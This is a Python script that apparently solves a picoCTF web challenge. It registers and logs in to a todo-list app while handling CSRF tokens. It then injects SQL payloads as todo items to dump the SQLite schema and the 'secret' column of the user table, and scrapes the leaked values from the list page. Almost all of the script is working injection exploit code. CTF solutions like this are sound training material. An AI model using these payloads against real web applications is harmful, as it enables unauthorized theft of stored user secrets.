from requests import *
from bs4 import BeautifulSoup

username_and_password = 'asdfewrgfablf;a'

def get_token(text):
    soup = BeautifulSoup(text , 'html.parser')
    token = soup.find('input' , {'id' : 'csrf_token'}).get('value')
    return token

def find_table(tables,pos=int()):
    while(True):
        begin_pos=tables[pos:].find('</strong>')
        if(begin_pos==-1):
            break
        end_pos=tables[pos+begin_pos:].find('</li>')
        if(end_pos==-1):
            break
        print(tables[begin_pos+len('</strong>')+pos:end_pos+begin_pos+pos])
        pos+=end_pos+begin_pos
    return

def add_todo(item , token):
    url_add = 'https://2019shell1.picoctf.com/problem/4155/add_item'
    headers_add = {
        'Referer' : 'https://2019shell1.picoctf.com/problem/4155/list_items',
        'Host' : '2019shell1.picoctf.com'
    }
    data = {
        'csrf_token' : token,
        'item' : item,
        'submit' : 'Create'
    }
    r = s.post(url_add , data=data , headers=headers_add)
    return r.text


def todo_list():
    url_list = 'https://2019shell1.picoctf.com/problem/4155/list_items'
    headers_list = {
        'Host' : '2019shell1.picoctf.com',
        'Referer' : 'https://2019shell1.picoctf.com/problem/4155/add_item'
    }
    r = s.get(url_list , headers=headers_list)
    soup = BeautifulSoup(r.text , 'html.parser')
    tables = soup.find_all('li')
    tables = str(tables)
    find_table(tables)
    return

def input_data(item , token):
    source_code_add = add_todo(item , token)
    token = get_token(source_code_add)

s = Session()
url = 'https://2019shell1.picoctf.com/problem/4155/register'
r = s.get(url)
token = get_token(r.text)

data = {
    'csrf_token' : token,
    'username' : username_and_password,
    'name' : username_and_password,
    'password' : username_and_password,
    'password2' : username_and_password,
    'submit' : 'Register'
}
headers = {
    'Host' : '2019shell1.picoctf.com',
    'Origin' : 'https://2019shell1.picoctf.com',
    'Referer' : 'https://2019shell1.picoctf.com/problem/4155/register'
}

r = s.post(url , data=data , headers=headers)
token = get_token(r.text)
headers = {
    'Referer' : 'https://2019shell1.picoctf.com/problem/4155/login',
    'Host' : '2019shell1.picoctf.com',
    'Origin' : 'https://2019shell1.picoctf.com'
}

url = 'https://2019shell1.picoctf.com/problem/4155/login'
data = {
    'csrf_token' : token,
    'username' : username_and_password,
    'password' : username_and_password,
    'submit' : 'Sign In'
}

r = s.post(url , data=data , headers=headers)

item = "'||(select sql from sqlite_master)||'"
input_data(item , token)

item = "'||(select secret from user)||'"
input_data(item , token)

item = "'||(select group_concat(secret) from user)||'"
input_data(item , token)
todo_list()
